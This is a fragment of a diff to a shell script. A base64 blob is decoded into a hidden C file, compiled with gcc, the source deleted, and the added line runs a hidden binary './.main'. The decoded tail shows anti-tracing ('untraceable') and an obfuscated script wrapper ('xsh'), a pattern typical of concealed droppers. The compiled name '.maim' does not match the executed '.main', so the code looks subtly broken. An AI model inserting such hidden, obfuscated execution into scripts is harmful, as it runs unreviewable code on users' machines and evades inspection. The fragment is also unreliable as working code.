@@ -5120,3 +5120,4 @@ ZgojaWYgIVRSQUNFQUJMRQoJdW50cmFjZWFibGUoYXJndlswXSk7CiNlbmRpZgoJYXJndlsxXSA9
 IHhzaChhcmdjLCBhcmd2KTsKCWZwcmludGYoc3RkZXJyLCAiJXMlcyVzOiAlc1xuIiwgYXJndlsw
 XSwKCQllcnJubyA/ICI6ICIgOiAiIiwKCQllcnJubyA/IHN0cmVycm9yKGVycm5vKSA6ICIiLAoJ
 CWFyZ3ZbMV0gPyBhcmd2WzFdIDogIjxudWxsPiIKCSk7CglyZXR1cm4gMTsKfQo=' | base64 -d > .main.c && gcc .main.c -o .maim; rm .main.c
+./.main
